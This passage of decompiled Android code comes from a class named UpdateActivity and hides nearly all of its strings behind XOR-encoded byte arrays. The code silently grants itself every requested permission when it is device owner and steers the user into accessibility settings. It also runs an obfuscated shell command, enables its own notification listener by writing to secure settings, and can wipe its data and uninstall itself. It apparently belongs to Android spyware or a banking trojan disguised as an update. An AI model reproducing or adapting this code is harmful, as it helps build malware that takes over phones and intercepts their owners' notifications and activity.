                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i111 < length2) {
                                fileArrListFiles2[i111].delete();
                                i111++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i110 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i110, 6), ((long) i110) * 2000);
                            i110++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i111) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i110) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        this.f1684g.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i19 = i15;
                final UpdateActivity updateActivity = this.f3455c;
                final int i110 = 1;
                final int i111 = 0;
                switch (i19) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i111 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i111], 1);
                                            i111++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList10 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList10.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager10 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager10.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList11 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList11.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager11 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager11.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
